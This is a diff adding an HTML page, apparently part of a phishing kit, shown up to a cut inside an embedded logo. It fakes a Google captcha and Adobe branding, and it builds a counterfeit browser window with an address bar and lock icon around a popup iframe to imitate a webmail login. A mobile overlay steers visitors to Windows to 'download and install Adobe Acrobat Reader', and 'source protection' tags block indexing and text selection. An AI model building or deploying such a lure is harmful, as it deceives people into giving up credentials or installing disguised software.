@@ -1,0 +1,1450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Webmail Popup Example</title>
+  
+  <!-- Source Protection Meta Tags -->
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta http-equiv="X-Frame-Options" content="DENY">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="Referrer-Policy" content="no-referrer">
+  <style>
+    body {
+      font-family: 'Adobe Clean', 'Segoe UI', Arial, sans-serif;
+      background: #1e1e1e;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding-top: 15vh;
+      /* Disable text selection */
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      /* Disable highlighting */
+      -webkit-touch-callout: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    /* Captcha verification styles */
+    #captcha-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: #000000;
+      z-index: 10000;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Adobe Clean', 'Helvetica Neue', Arial, sans-serif;
+      color: #ffffff;
+    }
+
+    #captcha-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      max-width: 380px;
+      padding: 1.5em;
+      width: 100%;
+    }
+
+    .google-header {
+      margin-bottom: 1em;
+    }
+
+    .google-header img {
+      width: 160px;
+      height: auto;
+    }
+
+    .challenge-desc {
+      color: #ffffff;
+      text-align: center;
+      margin-bottom: 0.8em;
+      font-size: 12px;
+      line-height: 1.2;
+    }
+
+    .captcha-container {
+      background-color: #1a1a1a;
+      border: 1px solid #ff0000;
+      border-radius: 6px;
+      padding: 1em;
+      margin: 0.5em 0;
+      box-shadow: 0 2px 8px rgba(255, 0, 0, 0.2);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      max-width: 320px;
+      min-height: auto;
+      width: 100%;
+      box-sizing: border-box;
+      position: relative;
+    }
+
+    .g-recaptcha {
+      margin: 0.5em 0;
+      transform: scale(0.8);
+      transform-origin: center;
+    }
+
+    #continue-btn {
+      background-color: #ff0000;
+      border: none;
+      color: #ffffff;
+      padding: 0.7em 1.8em;
+      border-radius: 4px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 0.8em;
+      margin-bottom: 0.3em;
+      width: fit-content;
+      align-self: center;
+      position: relative;
+      z-index: 1;
+    }
+
+    #continue-btn:hover {
+      background-color: #cc0000;
+      box-shadow: 0 2px 8px rgba(255, 0, 0, 0.4);
+    }
+
+    #continue-btn:disabled {
+      background-color: #666666;
+      cursor: not-allowed;
+    }
+
+    .recaptcha-disclaimer {
+      color: #cccccc;
+      font-size: 9px;
+      text-align: center;
+      margin-top: 0.8em;
+      line-height: 1.3;
+      max-width: 250px;
+    }
+
+    .recaptcha-disclaimer a {
+      color: #ff0000;
+      text-decoration: none;
+    }
+
+    .recaptcha-disclaimer a:hover {
+      text-decoration: underline;
+    }
+
+    /* Main content styles */
+    #main-content {
+      display: none;
+      width: 100%;
+      height: 100vh;
+      position: fixed;
+      top: 0;
+      left: 0;
+    }
+
+    #main-content.show {
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding-top: 15vh;
+    }
+
+    #iframe-btn-container {
+      max-width: 450px;
+      margin: 0 auto;
+      background: rgba(44, 44, 44, 0.95);
+      border-radius: 8px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.7);
+      padding: 40px 32px;
+      text-align: center;
+      z-index: 2;
+      position: relative;
+      border: 1px solid #3a3a3a;
+      backdrop-filter: blur(10px);
+    }
+    #iframe-btn-container .adobe-logo {
+      width: 48px;
+      height: 48px;
+      margin: 0 auto 24px auto;
+      display: block;
+      object-fit: contain;
+      border-radius: 4px;
+    }
+    #iframe-btn-container .instructions {
+      font-size: 16px;
+      color: #e8e8e8;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+    #open-iframe-btn {
+      margin: 0 auto;
+      display: block;
+      padding: 14px 40px;
+      font-size: 16px;
+      font-weight: 600;
+      background: #fa0f00;
+      color: #fff;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      letter-spacing: 0.5px;
+    }
+    #open-iframe-btn:hover {
+      background: #e30e00;
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(250, 15, 0, 0.3);
+    }
+    #iframe-modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.6);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+    }
+    #iframe-modal .modal-content {
+      background: #202124;
+      border-radius: 8px;
+      max-width: 900px;
+      max-height: 600px;
+      width: 900px;
+      height: 600px;
+      min-width: 320px;
+      min-height: 200px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+      border: 1px solid #3c4043;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    @media (max-width: 750px) {
+      #iframe-modal .modal-content {
+        width: 90vw;
+        height: 90vh;
+        max-width: 98vw;
+        max-height: 98vh;
+      }
+    }
+    /* Browser Header Styles */
+    .browser-header {
+      background: #202124;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    /* Tab Bar */
+    .tab-bar {
+      height: 38px;
+      background: #202124;
+      display: flex;
+      align-items: flex-end;
+      padding: 0 8px 0 80px;
+      position: relative;
+    }
+    
+    .tab {
+      height: 32px;
+      min-width: 240px;
+      max-width: 240px;
+      background: #35363a;
+      border-top-left-radius: 8px;
+      border-top-right-radius: 8px;
+      display: flex;
+      align-items: center;
+      padding: 0 12px;
+      margin-right: -1px;
+      position: relative;
+      cursor: pointer;
+      transition: background 0.1s;
+    }
+    
+    .tab.active {
+      background: #2d2e31;
+      z-index: 2;
+    }
+    
+    .tab-favicon {
+      width: 16px;
+      height: 16px;
+      margin-right: 8px;
+      flex-shrink: 0;
+    }
+    
+    .tab-title {
+      flex: 1;
+      color: #e8eaed;
+      font-size: 12px;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    
+    .tab-close {
+      width: 16px;
+      height: 16px;
+      margin-left: 8px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.1s;
+      cursor: pointer;
+    }
+    
+    .tab-close:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+    
+    .tab-close svg {
+      width: 10px;
+      height: 10px;
+      stroke: #9aa0a6;
+      stroke-width: 1.5;
+    }
+    
+    /* Window Controls */
+    .window-controls {
+      position: absolute;
+      top: 0;
+      right: 0;
+      display: flex;
+      height: 38px;
+      z-index: 10;
+    }
+    
+    .window-control {
+      width: 46px;
+      height: 38px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background 0.1s;
+      position: relative;
+    }
+    
+    .window-control:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+    
+    .window-control.close:hover {
+      background: #e81123;
+    }
+    
+    .window-control::before {
+      content: '';
+      position: absolute;
+      display: block;
+    }
+    
+    .window-control.minimize::before {
+      width: 10px;
+      height: 1px;
+      background: #9aa0a6;
+    }
+    
+    .window-control.maximize::before {
+      width: 10px;
+      height: 10px;
+      border: 1px solid #9aa0a6;
+      background: transparent;
+    }
+    
+    .window-control.close::before,
+    .window-control.close::after {
+      width: 11px;
+      height: 1px;
+      background: #9aa0a6;
+    }
+    
+    .window-control.close::before {
+      transform: rotate(45deg);
+    }
+    
+    .window-control.close::after {
+      content: '';
+      position: absolute;
+      transform: rotate(-45deg);
+    }
+    
+    .window-control.close:hover::before,
+    .window-control.close:hover::after {
+      background: #fff;
+    }
+    
+    /* Navigation Bar */
+    .nav-bar {
+      height: 40px;
+      background: #2d2e31;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      gap: 8px;
+      border-bottom: 1px solid #3c4043;
+    }
+    
+    .nav-button {
+      width: 32px;
+      height: 28px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background 0.1s;
+    }
+    
+    .nav-button:hover:not(.disabled) {
+      background: rgba(255, 255, 255, 0.1);
+    }
+    
+    .nav-button.disabled {
+      opacity: 0.4;
+      cursor: default;
+    }
+    
+    .nav-button svg {
+      width: 16px;
+      height: 16px;
+      stroke: #9aa0a6;
+      stroke-width: 2;
+      fill: none;
+    }
+    /* Address Bar */
+    .address-bar-container {
+      flex: 1;
+      background: #202124;
+      border-radius: 20px;
+      border: 1px solid #5f6368;
+      display: flex;
+      align-items: center;
+      padding: 0 4px;
+      height: 32px;
+      transition: background 0.1s, border-color 0.1s;
+    }
+    
+    .address-bar-container:hover {
+      background: #303134;
+    }
+    
+    .address-bar-container:focus-within {
+      background: #303134;
+      border-color: #8ab4f8;
+    }
+    .site-info {
+      display: flex;
+      align-items: center;
+      padding: 0 8px;
+      height: 24px;
+      border-radius: 12px;
+      transition: background 0.1s;
+      cursor: pointer;
+    }
+    
+    .site-info:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+    
+    .lock-icon {
+      width: 14px;
+      height: 14px;
+      margin-right: 6px;
+    }
+    
+    .url-text {
+      color: #e8eaed;
+      font-size: 14px;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      max-width: 600px;
+    }
+    
+    .nav-extensions {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      margin-left: 8px;
+    }
+    
+    .extension-icon {
+      width: 28px;
+      height: 28px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background 0.1s;
+    }
+    
+    .extension-icon:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+    
+    .extension-icon img {
+      width: 20px;
+      height: 20px;
+    }
+    
+    .browser-menu {
+      width: 32px;
+      height: 28px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background 0.1s;
+      margin-left: 8px;
+    }
+    
+    .browser-menu:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+    
+    /* Browser-specific styles */
+    .browser-chrome .tab-bar {
+      background: #202124;
+    }
+    
+    .browser-firefox .browser-header {
+      background: #0c0c0d;
+    }
+    
+    .browser-firefox .tab {
+      background: #38383d;
+      border-radius: 4px 4px 0 0;
+    }
+    
+    .browser-firefox .tab.active {
+      background: #4a4a4f;
+    }
+    
+    .browser-firefox .nav-bar {
+      background: #38383d;
+    }
+    
+    .browser-edge .browser-header {
+      background: #2b2b2b;
+    }
+    
+    .browser-edge .tab {
+      background: #3b3b3b;
+    }
+    
+    .browser-safari .browser-header {
+      background: #39393d;
+    }
+    
+    .browser-safari .window-controls {
+      left: 0;
+      right: auto;
+    }
+    
+    .browser-safari .window-control {
+      width: 12px;
+      height: 12px;
+      margin: 13px 4px;
+      border-radius: 50%;
+    }
+    
+    .browser-safari .window-control::before,
+    .browser-safari .window-control::after {
+      display: none;
+    }
+    
+    .browser-safari .window-control.close {
+      background: #ff5f57;
+      margin-left: 12px;
+    }
+    
+    .browser-safari .window-control.minimize {
+      background: #febc2e;
+    }
+    
+    .browser-safari .window-control.maximize {
+      background: #28ca42;
+    }
+    
+    .browser-safari .window-control:hover {
+      opacity: 0.8;
+      background-color: inherit;
+    }
+    
+    .browser-safari .window-control.close:hover {
+      background: #ff5f57;
+    }
+    #popup-iframe {
+      flex: 1;
+      width: 100%;
+      border: none;
+      border-bottom-left-radius: 8px;
+      border-bottom-right-radius: 8px;
+      min-height: 300px;
+      background: #fff;
+    }
+    #blurry-bg {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      z-index: 0;
+      background: url('https://res-academy.cache.wpscdn.com/images/d7805aca4a1d34495f37d14bc9f12ccb.png') center center/cover no-repeat;
+      filter: blur(2px) brightness(0.85) contrast(1.1);
+      opacity: 0.9;
+    }
+    #iframe-btn-container {
+      position: relative;
+      z-index: 2;
+    }
+    #iframe-modal {
+      position: relative;
+      z-index: 1;
+    }
+
+    /* Mobile warning popup styles */
+    #mobile-warning-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.9);
+      z-index: 99999;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    .mobile-warning-modal {
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      max-width: 380px;
+      width: 90%;
+      padding: 30px;
+      text-align: center;
+      position: relative;
+      margin: 20px;
+    }
+
+    .mobile-warning-icon {
+      font-size: 48px;
+      margin-bottom: 20px;
+      color: #ff4444;
+    }
+
+    .mobile-warning-title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #333333;
+      margin-bottom: 16px;
+      line-height: 1.3;
+    }
+
+    .mobile-warning-message {
+      font-size: 16px;
+      color: #666666;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    .mobile-warning-highlight {
+      font-weight: 600;
+      color: #333333;
+    }
+
+    .mobile-warning-btn {
+      background: #007AFF;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 24px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      width: 100%;
+    }
+
+    .mobile-warning-btn:hover {
+      background: #0056CC;
+    }
+
+    /* Responsive adjustments for main content */
+    @media (max-width: 480px) {
+      #main-content.show {
+        padding-top: 10vh;
+        padding-left: 20px;
+        padding-right: 20px;
+      }
+      
+      #iframe-btn-container {
+        max-width: 90%;
+        padding: 30px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Mobile Warning Overlay -->
+  <div id="mobile-warning-overlay">
+    <div class="mobile-warning-modal">
+      <div class="mobile-warning-icon">🖥️</div>
+      <div class="mobile-warning-title">Windows Desktop Required</div>
+      <div class="mobile-warning-message">
+        This Adobe file is designed for <span class="mobile-warning-highlight">Windows desktop computers only</span>.<br><br>
+        
+        Please visit this page using a <span class="mobile-warning-highlight">Windows desktop or laptop computer</span> to download and install Adobe Acrobat Reader.<br><br>
+        
+        Mobile devices and other operating systems are not supported for this file.
+      </div>
+      <button class="mobile-warning-btn" onclick="closeMobileWarning()">I Understand</button>
+    </div>
+  </div>
+
+  <!-- Captcha Verification Overlay -->
+  <div id="captcha-overlay">
+    <div id="captcha-section">
+      <div class="google-header">
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMTUyLjE5OSIgaGVpZ2h0PSI4NCIgdmlld0JveD0iMCAwIDE1Mi4xOTkgODQiPgogIDxkZWZzPgogICAgPGZpbHRlciBpZD0iUGF0aF80IiB4PSIzNi4wMDgiIHk9IjUuNjY0IiB3aWR0aD0iNzIuNjgyIiBoZWlnaHQ9IjczLjU2OSIgZmlsdGVyVW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgICAgPGZlT2Zmc2V0IGlucHV0PSJTb3VyY2VBbHBoYSIvPgogICAgICA8ZmVHYXVzc2lhbkJsdXIgc3RkRGV2aWF0aW9uPSIxMCIgcmVzdWx0PSJibHVyIi8+CiAgICAgIDxmZUZsb29kIGZsb29kLWNvbG9yPSIjZmZmIiBmbG9vZC1vcGFjaXR5PSIwLjUwMiIvPgogICAgICA8ZmVDb21wb3NpdGUgb3BlcmF0b3I9ImluIiBpbjI9ImJsdXIiLz4KICAgICAgPGZlQ29tcG9zaXRlIGluPSJTb3VyY2VHcmFwaGljIi8+CiAgICA8L2ZpbHRlcj4KICAgIDxmaWx0ZXIgaWQ9IlBhdGhfNSIgeD0iNDguOTk4IiB5PSI0LjU0NiIgd2lkdGg9IjY5LjY1NCIgaGVpZ2h0PSI3NC44OTUiIGZpbHRlclVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxmZU9mZnNldCBpbnB1dD0iU291cmNlQWxwaGEiLz4KICAgICAgPGZlR2F1c3NpYW5CbHVyIHN0ZERldmlhdGlvbj0iMTAiIHJlc3VsdD0iYmx1ci0yIi8+CiAgICAgIDxmZUZsb29kIGZsb29kLWNvbG9yPSIjZmZmIiBmbG9vZC1vcGFjaXR5PSIwLjUwMiIvPgogICAgICA8ZmVDb21wb3NpdGUgb3BlcmF0b3I9ImluIiBpbjI9ImJsdXItMiIvPgogICAgICA8ZmVDb21wb3NpdGUgaW49IlNvdXJjZUdyYXBoaWMiLz4KICAgIDwvZmlsdGVyPgogICAgPGZpbHRlciBpZD0iUGF0aF82IiB4PSI2MC4yMiIgeT0iOC43MyIgd2lkdGg9IjcwLjIxMyIgaGVpZ2h0PSI3MC43MSIgZmlsdGVyVW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgICAgPGZlT2Zmc2V0IGlucHV0PSJTb3VyY2VBbHBoYSIvPgogICAgICA8ZmVHYXVzc2lhbkJsdXIgc3RkRGV2aWF0aW9uPSIxMCIgcmVzdWx0PSJibHVyLTMiLz4KICAgICAgPGZlRmxvb2QgZmxvb2QtY29sb3I9IiNmZmYiIGZsb29kLW9wYWNpdHk9IjAuNTAyIi8+CiAgICAgIDxmZUNvbXBvc2l0ZSBvcGVyYXRvcj0iaW4iIGluMj0iYmx1ci0zIi8+CiAgICAgIDxmZUNvbXBvc2l0ZSBpbj0iU291cmNlR3JhcGhpYyIvPgogICAgPC9maWx0ZXI+CiAgICA8ZmlsdGVyIGlkPSJQYXRoXzciIHg9IjcyLjExNSIgeT0iNC41NDUiIHdpZHRoPSI2OS41OTIiIGhlaWdodD0iNzQuODk1IiBmaWx0ZXJVbml0cz0idXNlclNwYWNlT25Vc2UiPgogICAgICA8ZmVPZmZzZXQgaW5wdXQ9IlNvdXJjZUFscGhhIi8+CiAgICAgIDxmZUdhdXNzaWFuQmx1ciBzdGREZXZpYXRpb249IjEwIiByZXN1bHQ9ImJsdXItNCIvPgogICAgICA8ZmVGbG9vZCBmbG9vZC1jb2xvcj0iI2ZmZiIgZmxvb2Qtb3BhY2l0eT0iMC41MDIiLz4KICAgICAgPGZlQ29tcG9zaXRlIG9wZXJhdG9yPSJpbiIgaW4yPSJibHVyLTQiLz4KICAgICAgPGZlQ29tcG9zaXRlIGluPSJTb3VyY2VHcmFwaGljIi8+CiAgICA8L2ZpbHRlcj4KICAgIDxmaWx0ZXIgaWQ9IlBhdGhfOCIgeD0iODIuODE1IiB5PSI4LjcyOSIgd2lkdGg9IjY5LjM4NCIgaGVpZ2h0PSI3MC43MTEiIGZpbHRlclVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxmZU9mZnNldCBpbnB1dD0iU291cmNlQWxwaGEiLz4KICAgICAgPGZlR2F1c3NpYW5CbHVyIHN0ZERldmlhdGlvbj0iMTAiIHJlc3VsdD0iYmx1ci01Ii8+CiAgICAgIDxmZUZsb29kIGZsb29kLWNvbG9yPSIjZmZmIiBmbG9vZC1vcGFjaXR5PSIwLjUwMiIvPgogICAgICA8ZmVDb21wb3NpdGUgb3BlcmF0b3I9ImluIiBpbjI9ImJsdXItNSIvPgogICAgICA8ZmVDb21wb3NpdGUgaW49IlNvdXJjZUdyYXBoaWMiLz4KICAgIDwvZmlsdGVyPgogICAgPGZpbHRlciBpZD0iUGF0aF85IiB4PSIxNy4wOTQiIHk9IjAiIHdpZHRoPSI3MC4wMjQiIGhlaWdodD0iODQiIGZpbHRlclVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxmZU9mZnNldCBpbnB1dD0iU291cmNlQWxwaGEiLz4KICAgICAgPGZlR2F1c3NpYW5CbHVyIHN0ZERldmlhdGlvbj0iMTAiIHJlc3VsdD0iYmx1ci02Ii8+CiAgICAgIDxmZUZsb29kIGZsb29kLWNvbG9yPSIjZmZmIiBmbG9vZC1vcGFjaXR5PSIwLjUwMiIvPgogICAgICA8ZmVDb21wb3NpdGUgb3BlcmF0b3I9ImluIiBpbjI9ImJsdXItNiIvPgogICAgICA8ZmVDb21wb3NpdGUgaW49IlNvdXJjZUdyYXBoaWMiLz4KICAgIDwvZmlsdGVyPgogICAgPGZpbHRlciBpZD0iUGF0aF8xMCIgeD0iMCIgeT0iMCIgd2lkdGg9IjcwLjAzMSIgaGVpZ2h0PSI4NCIgZmlsdGVyVW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgICAgPGZlT2Zmc2V0IGlucHV0PSJTb3VyY2VBbHBoYSIvPgogICAgICA8ZmVHYXVzc2lhbkJsdXIgc3RkRGV2aWF0aW9uPSIxMCIgcmVzdWx0PSJibHVyLTciLz4KICAgICAgPGZlRmxvb2QgZmxvb2QtY29sb3I9IiNmZmYiIGZsb29kLW9wYWNpdHk9IjAuNTAyIi8+CiAgICAgIDxmZUNvbXBvc2l0ZSBvcGVyYXRvcj0iaW4iIGluMj0iYmx1ci03Ii8+CiAgICAgIDxmZUNvbXBvc2l0ZSBpbj0iU291cmNlR3JhcGhpYyIvPgogICAgPC9maWx0ZXI+CiAgICA8ZmlsdGVyIGlkPSJQYXRoXzExIiB4PSI5LjE4IiB5PSI4Ljg0NCIgd2lkdGg9IjcwLjc3IiBoZWlnaHQ9Ijc1LjE1NCIgZmlsdGVyVW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgICAgPGZlT2Zmc2V0IGlucHV0PSJTb3VyY2VBbHBoYSIvPgogICAgICA8ZmVHYXVzc2lhbkJsdXIgc3RkRGV2aWF0aW9uPSIxMCIgcmVzdWx0PSJibHVyLTgiLz4KICAgICAgPGZlRmxvb2QgZmxvb2QtY29sb3I9IiNmZmYiIGZsb29kLW9wYWNpdHk9IjAuNTAyIi8+CiAgICAgIDxmZUNvbXBvc2l0ZSBvcGVyYXRvcj0iaW4iIGluMj0iYmx1ci04Ii8+CiAgICAgIDxmZUNvbXBvc2l0ZSBpbj0iU291cmNlR3JhcGhpYyIvPgogICAgPC9maWx0ZXI+CiAgPC9kZWZzPgogIDxnIGlkPSJBZG9iZV9Mb2dvIiBkYXRhLW5hbWU9IkFkb2JlIExvZ28iIHRyYW5zZm9ybT0idHJhbnNsYXRlKDMwIDMwKSI+CiAgICA8ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLCAwLCAwLCAxLCAtMzAsIC0zMCkiIGZpbHRlcj0idXJsKCNQYXRoXzQpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfNC0yIiBkYXRhLW5hbWU9IlBhdGggNCIgZD0iTTczMS43NzItMTIwLjE2NWwtLjk5NSwzLjA2NmEuMjI0LjIyNCwwLDAsMS0uMjI4LjE2NmgtMi40Yy0uMTQ1LDAtLjE4Ni0uMDgzLS4xNjYtLjIwN2w0LjE0My0xMS45NTNhMy43NjMsMy43NjMsMCwwLDAsLjIwOC0xLjI2NC4xMzguMTM4LDAsMCwxLC4xMjQtLjE0NWgzLjMxNWMuMSwwLC4xNDUuMDIxLjE2Ni4xMjRsNC43LDEzLjI1OWMuMDQxLjEuMDIxLjE4Ni0uMS4xODZoLTIuNjkzYS4yMDkuMjA5LDAsMCwxLS4yMjgtLjE0NWwtMS4wNTYtMy4wODdabTQuMDE5LTIuNTg5Yy0uNDE0LTEuMzY3LTEuMjQzLTMuODc0LTEuNjM3LTUuMzQ1aC0uMDIxYy0uMzMxLDEuMzg4LTEuMDc3LDMuNjY3LTEuNjE2LDUuMzQ1WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTY2MS45NyAxNjYuMTcpIiBmaWxsPSIjZmEwZjAwIi8+CiAgICA8L2c+CiAgICA8ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLCAwLCAwLCAxLCAtMzAsIC0zMCkiIGZpbHRlcj0idXJsKCNQYXRoXzUpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfNS0yIiBkYXRhLW5hbWU9IlBhdGggNSIgZD0iTTc1Ny41MDgtMTIzLjQxMmMwLTIuOTYyLDIuMjE2LTUuNDQ4LDYuMDA4LTUuNDQ4LjE2NSwwLC4zNzMuMDIxLjY4NC4wNDFWLTEzMi45YS4xMzEuMTMxLDAsMCwxLC4xNDUtLjE0NWgyLjYxYy4xLDAsLjEyNS4wNDEuMTI1LjEyNHYxMi4yNDNhMTEuNzE2LDExLjcxNiwwLDAsMCwuMDgzLDEuNTEzYzAsLjEtLjAyMS4xNDUtLjE0NS4xODZhMTAuNDA4LDEwLjQwOCwwLDAsMS00LjA4MS44MjljLTMuMDY2LDAtNS40MjgtMS43NC01LjQyOC01LjI2Mm02LjY5MS0yLjk0MmEyLjE1LDIuMTUsMCwwLDAtLjc2Ny0uMSwyLjc2NCwyLjc2NCwwLDAsMC0yLjk2MiwyLjljMCwyLjA1MSwxLjE4MSwyLjk0MiwyLjc1NSwyLjk0MmEyLjkyNSwyLjkyNSwwLDAsMCwuOTc0LS4xMjRaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNjc4LjUxIDE2Ny41OSkiIGZpbGw9IiNmYTBmMDAiLz4KICAgIDwvZz4KICAgIDxnIHRyYW5zZm9ybT0ibWF0cml4KDEsIDAsIDAsIDEsIC0zMCwgLTMwKSIgZmlsdGVyPSJ1cmwoI1BhdGhfNikiPgogICAgICA8cGF0aCBpZD0iUGF0aF82LTIiIGRhdGEtbmFtZT0iUGF0aCA2IiBkPSJNNzkzLjIzNC0xMTguMjI4YzAsMy4yNTMtMi4xMTMsNS40MDctNS4xLDUuNDA3LTMuNTQzLDAtNS4xMTctMi42NzItNS4xMTctNS4zNDVhNS4wNjksNS4wNjksMCwwLDEsNS4xNTgtNS4zNjVjMy4zMzUsMCw1LjA1NSwyLjUwNiw1LjA1NSw1LjNtLTcuMjkyLjAyMWMwLDEuODIzLjg0OSwyLjk4MywyLjIzNywyLjk4MywxLjIsMCwyLjExMy0xLjAzNiwyLjExMy0yLjk0MiwwLTEuNjE2LS42NjMtMi45NjItMi4yMzctMi45NjItMS4yLDAtMi4xMTMsMS4wNzctMi4xMTMsMi45MjEiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC02OTIuOCAxNjIuMjYpIiBmaWxsPSIjZmEwZjAwIi8+CiAgICA8L2c+CiAgICA8ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLCAwLCAwLCAxLCAtMzAsIC0zMCkiIGZpbHRlcj0idXJsKCNQYXRoXzcpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfNy0yIiBkYXRhLW5hbWU9IlBhdGggNyIgZD0iTTgxMi43MzctMTMzLjA0NmMuMTY2LDAsLjIwNy4wMjEuMjA3LjE2NnY0LjI0N2E2LjY3OSw2LjY3OSwwLDAsMSwxLjc0LS4yMjgsNC43NDEsNC43NDEsMCwwLDEsNC45NzIsNC45MzFjMCwzLjg3NC0zLjA2Niw1Ljc4LTYuMjE0LDUuNzhhMTAuODQyLDEwLjg0MiwwLDAsMS0zLjI1My0uNDc2LjI0NC4yNDQsMCwwLDEtLjEyNC0uMjA3Vi0xMzIuOWMwLS4xLjA0MS0uMTQ1LjE0NS0uMTQ1Wm0xLjQzLDYuNjI5YTQuMjIsNC4yMiwwLDAsMC0xLjIyMi4xNjZ2NS42MTRhMy4yMjYsMy4yMjYsMCwwLDAsLjc2Ny4wODMsMi44NTEsMi44NTEsMCwwLDAsMy0zLjEwNywyLjQzNCwyLjQzNCwwLDAsMC0yLjU0OC0yLjc1NSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTcwNy45NSAxNjcuNTkpIiBmaWxsPSIjZmEwZjAwIi8+CiAgICA8L2c+CiAgICA8ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLCAwLCAwLCAxLCAtMzAsIC0zMCkiIGZpbHRlcj0idXJsKCNQYXRoXzgpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfOC0yIiBkYXRhLW5hbWU9IlBhdGggOCIgZD0iTTgzNy4zMzQtMTE3LjQyMWMuMSwxLjE4MS45MzIsMi4xNTUsMi45NjIsMi4xNTVhNi40MTIsNi40MTIsMCwwLDAsMi41NDgtLjQ3N2MuMDYzLS4wNDEuMTI1LS4wMjEuMTI1LjF2MS45NjhjMCwuMTQ1LS4wNDEuMjA3LS4xNDUuMjQ5YTYuOTYxLDYuOTYxLDAsMCwxLTMuMTcuNmMtMy44OTQsMC01LjI2Mi0yLjY3Mi01LjI2Mi01LjI0MSwwLTIuODU5LDEuNzYxLTUuNDY5LDUuMDEzLTUuNDY5YTQuMjI0LDQuMjI0LDAsMCwxLDQuMzcxLDQuNDc1LDYuNjUsNi42NSwwLDAsMS0uMSwxLjM4OC4xNzkuMTc5LDAsMCwxLS4xNjYuMTY2LDE5LjE3MSwxOS4xNzEsMCwwLDEtMi4xMzQuMDgzWm0yLjY5My0yLjAwOWE2Ljc1NSw2Ljc1NSwwLDAsMCwxLjAzNi0uMDQxdi0uMTQ1YTEuNjg1LDEuNjg1LDAsMCww